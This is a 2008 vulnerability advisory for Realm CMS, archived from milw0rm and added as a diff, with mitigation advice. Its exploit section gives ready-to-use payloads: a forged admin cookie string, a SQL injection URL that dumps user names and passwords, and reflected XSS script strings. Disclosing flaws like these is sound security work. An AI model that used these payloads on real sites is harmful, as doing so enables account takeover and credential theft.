@@ -1,0 +1,75 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: Realm CMS Multiple Vulnerabilities Lead to Admin Access.
+# Vendor: www.realmproject.com
+# Vulnerable Version: 2.3 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: http://bugreport.ir/index.php?/40
+###################################################################################
+
+####################
+1. Description:
+####################
+ Realm CMS is an unique FREE classic ASP application integrating 
+together Content Management and Blogging web publishing. Realm CMS is 
+especially designed and tuned to be fast and smart handling web sites 
+including thousands of web pages. Realm CMS is fundamentally based on 
+the technology of caching - simultaneously using server's RAM and disk. 
+This means that Realm CMS web site is easily managed as are database 
+driven web sites and the same time it is as fast, robust as web sites 
+based on pure HTML. This feature makes Realm CMS MS Access database 
+driven web site fast and robust as are enterprise level database driven 
+sites. 
+
+####################
+2. Vulnerabilities:
+####################
+    2.1. Broken Authentication and Session Management. Attacker can enter to the admin pages by a manipulated cookie.
+        2.1.1. Exploit:
+                        Check the exploit section.
+    2.2. Injection Flaws. SQL Injection in "inc_routines.asp" in "KeyWordsList" function on "kwrd" parameter.
+        2.2.1. Exploit:
+                        Check the exploit section.
+    2.3. Cross Site Scripting (XSS), Information Leakage. Reflected XSS attack, and DB path disclosure in "/cms/_db/compact.asp"
+        2.3.1. Exploit:
+                        Check the exploit section.
+####################
+3. Exploits:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/40/exploit
+    3.1. Attacker can enter to the admin pages by a manipulated cookie.
+        -------------
+        -Set these cookies:
+            RealmCmsUser=cUserfiles=userFiles&cIntallType=BugReportTeam&cDbLocat=in&cSiteName=www.Bugreport.IR&cFolder=%2Fcms&cUniqueID=db&cUserRole=1&cUserName=Admin&cUserID=20
+        -Then go to:
+            /_RealmAdmin/login.asp
+        -------------
+    3.2. SQL Injection in "inc_routines.asp" in "KeyWordsList" function on "kwrd" parameter.
+        -------------
+        http://[URL]/cmsr/?job=kwl&kwrd=WWW.BugReport.IR' union select name,password from tblusers where name not like '%WWW.BugReport.IR
+        -------------
+    3.3. Reflected XSS attack, and DB path disclosure in "/cms/_db/compact.asp"
+        -------------
+        http://[URL]/cms/_db/compact.asp?CmpctedDB=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)
+        http://[URL]/cms/_db/compact.asp?CmpctedDB=1&Boyut=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E    (Reflected XSS attack)
+        http://[URL]/cms/_db/compact.asp    (DB path disclosure)
+        -------------
+####################
+4. Solution:
+####################
+    Rename admin directory "/_RealmAdmin" and wait for vendor patch (for 2.1).
+    Edit the source code to ensure that inputs are properly sanitized (for 2.2).
+    Remove or rename all the "/_db/compact.asp" files, in the cms (for 2.3).
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-09]
